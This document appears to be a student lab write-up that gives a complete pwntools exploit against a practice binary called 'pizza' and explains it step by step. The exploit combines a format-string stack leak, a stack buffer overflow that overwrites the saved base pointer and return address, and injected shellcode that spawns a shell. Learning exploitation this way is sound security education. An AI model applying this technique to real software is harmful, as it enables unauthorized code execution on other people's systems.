# Control Flow Integrity Violation


### Code:

```
from pwn import *

binary = ELF('./pizza')
context(arch='amd64', os='linux', endian='little', word_size=64)

shellcode = asm(shellcraft.amd64.sh(), arch='amd64')
print("shellcode size: " + str(len(shellcode)))

input1 = b'%p ' * 15

# Start the program
p = process('./pizza')
print(str(p.recvline(), "latin-1"))
#p.sendline(b"Bruce")
p.sendline(input1)
leak = str(p.recvline(), "latin-1")
print(leak)
leak = leak.split(' ')

# number of pizza input
p.sendline(b"1")
print(str(p.recvline(), "latin-1"))
print(str(p.recvline(), "latin-1"))
print(str(p.recvline(), "latin-1"))
print(str(p.recvline(), "latin-1"))
print(str(p.recvline(), "latin-1"))
print(str(p.recvline(), "latin-1"))
print(str(p.recvline(), "latin-1"))

return_addr = p64(int(leak[7], 16))
return_addr_1 = p64(int(leak[7], 16) + 0x20)

# credit card input
#payload = b'A' * 128 + b'CCCCCCCC' + return_addr + shellcode
payload = b'A' * 128 + return_addr + return_addr_1 + shellcode

#print(hex(id(return_addr)))
#print(payload)
#print(len(payload))

# card number payload
p.sendline(payload)

print(str(p.recvline(), "latin-1"))
#print(str(p.recvline(), "latin-1"))

#p.wait()
p.interactive()

'''
core = p.corefile
rsp = core.rsp
rbp = core.rbp
rip = core.rip

print(f"rsp: {hex(rsp)}")
print(f"rbp: {hex(rbp)}")
print(f"rip: {hex(rip)}")

top_of_stack = core.read(rsp, 8)
top_of_stack_1 = core.read(rsp+8, 8)
top_of_stack_2 = core.read(rsp+16, 8)
print(f"top of stack: {top_of_stack.hex()}")
print(f"top of stack 1: {top_of_stack_1.hex()}")
print(f"top of stack 2: {top_of_stack_2.hex()}")

'''

```

### Design & Functionality:

- There are a lot of trial and error steps in this assignment. We start with the given Python script in the assignment description.
- We run the pizza program and see that it needs 3 inputs and print out a few messages with its lifecycle.
- We try to crash the program and become successful in the credit card input. We observe that the program shows a segfault error if we enter more than 136 characters as the credit card number. The base pointer should be the last 8 bytes address and we need to find out what that address is.
- We obtain the shellcode that we are going to inject using `asm(shellcraft.amd64.sh(), arch='amd64')`.
- We use first `p.recvline()` to print out the welcome message.
- We send the first input line to the program as a bunch of `%p` to find the memory address of the base pointer. We deliberately crash the program by adding 1 more character (137 characters) than the threshold as the credit card number. As we inspect the output produced by the core file analysis, each time the address at location 7 is similar to the `rbp` address.
- We also see that the `rip` address is always 0x20 larger than the `rbp` address. So we capture the base pointer from location 7 and add 0x20 with it to get the `rip` address each time correctly.
- We use few `p.recvline()` to print the intermediate messages.
- Then we generate the card number payload by setting the padding (A * 128 bytes), the base pointer (8 bytes), the return address (8 bytes), and the shellcode (48 bytes), and then we inject it.
- We print one more rcvline() for the final message, use the interactive() function, and finally get the command line shell we are looking for.


